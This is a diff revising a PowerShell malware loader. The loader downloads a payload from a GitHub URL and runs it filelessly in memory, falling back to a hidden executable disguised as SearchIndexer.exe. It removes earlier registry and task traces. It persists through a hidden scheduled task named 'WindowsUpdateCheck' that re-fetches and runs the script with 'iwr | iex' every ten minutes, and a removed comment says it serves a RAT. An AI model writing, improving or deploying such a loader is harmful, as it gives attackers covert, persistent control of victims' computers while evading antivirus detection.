@@ -1,5 +1,5 @@
 # ==========================================
-# FINAL INVISIBLE LOADER (Stable & Clean)
+# FINAL HYBRID LOADER (RAM + DISK BACKUP)
 # ==========================================
 
 # --- CONFIGURATION ---
@@ -8,62 +8,63 @@ $GitHubUrl  = 'https://github.com/bibkbkbkibjb-dev/ss/raw/refs/heads/main/deploy
 $TaskName   = "WindowsUpdateCheck"
 
 # --- 1. CLEANUP (Removes old popups & traces) ---
-Write-Host "Cleaning up old traces..." -F Gray
 try {
-    # Remove the registry keys that caused white windows
+    # Remove registry keys causing white windows
     Remove-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SysDeploy" -ErrorAction SilentlyContinue
     Remove-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SysDeploy" -ErrorAction SilentlyContinue
     Remove-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsSystemInit" -ErrorAction SilentlyContinue
-
-    # Kill any leftover mshta processes
     Stop-Process -Name "mshta" -Force -ErrorAction SilentlyContinue
-    
-    # Remove old tasks
     Unregister-ScheduledTask -TaskName "MicrosoftWindowsUpdater" -Confirm:$false -ErrorAction SilentlyContinue
     Unregister-ScheduledTask -TaskName "SystemHealthCheck" -Confirm:$false -ErrorAction SilentlyContinue
 } catch {}
 
-# --- 2. EXECUTION FUNCTION (Fileless / RAM Only) ---
+# --- 2. EXECUTION FUNCTION (Smart Load) ---
 function Run-Payload {
-    Write-Host "Attempting Fileless Load..." -F Gray
+    Write-Host "Downloading Payload..." -F Gray
     try {
-        # Download bytes to Memory
         $wc = New-Object System.Net.WebClient
         $bytes = $wc.DownloadData($PayloadUrl)
-        
-        # Load Assembly (Using AppDomain to avoid simple signatures)
+    } catch {
+        Write-Host "⚠️ Download Failed (Check URL/Internet)" -F Red; return
+    }
+
+    # METHOD A: RAM (Fileless)
+    try {
+        Write-Host "   [1] Trying RAM Load..." -F Gray
         $assembly = [System.AppDomain]::CurrentDomain.Load($bytes)
-        
-        # Run EntryPoint
         $entry = $assembly.EntryPoint
         if ($entry) {
             $entry.Invoke($null, $null)
-            Write-Host "✅ Payload Running (Hidden)" -F Green
+            Write-Host "      ✅ Success (RAM Mode)" -F Green
+            return
         }
     } catch {
-        Write-Host "⚠️ Execution Failed (AV Blocked)" -F Red
+        Write-Host "      ⚠️ RAM Failed (32-bit/64-bit mismatch). Switching to Disk..." -F Yellow
+    }
+
+    # METHOD B: DISK (Fallback)
+    try {
+        Write-Host "   [2] Trying Disk Load..." -F Gray
+        # Save to a hidden system folder
+        $hiddenPath = "$env:APPDATA\Microsoft\Windows\Templates\SearchIndexer.exe"
+        [IO.File]::WriteAllBytes($hiddenPath, $bytes)
+        Start-Process $hiddenPath -WindowStyle Hidden
+        Write-Host "      ✅ Success (Disk Mode): $hiddenPath" -F Green
+    } catch {
+        Write-Host "      ❌ Disk Failed. (Check Permissions)" -F Red
     }
 }
 
 # --- 3. PERSISTENCE (The "Zombie" Task) ---
-# This task re-downloads THIS script from GitHub every startup.
 try {
     $exists = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
     if (-not $exists) {
-        # Action: PowerShell downloads GitHub script -> IEX
         $cmd = "powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"iwr '$GitHubUrl' | iex`""
         
         $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"$cmd`""
-        
-        # Trigger: At Logon + Every 10 Minutes
         $Trigger1 = New-ScheduledTaskTrigger -AtLogon
         $Trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 10)
-        
-        # Principal: Run as USER (Interactive) but Hidden. 
-        # (This is better than SYSTEM for RATs because it can see the screen).
         $Principal = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Users" -RunLevel Highest
-        
-        # Settings: Hidden, don't stop on battery
         $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
         
         Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger @($Trigger1, $Trigger2) -Principal $Principal -Settings $Settings -Force | Out-Null
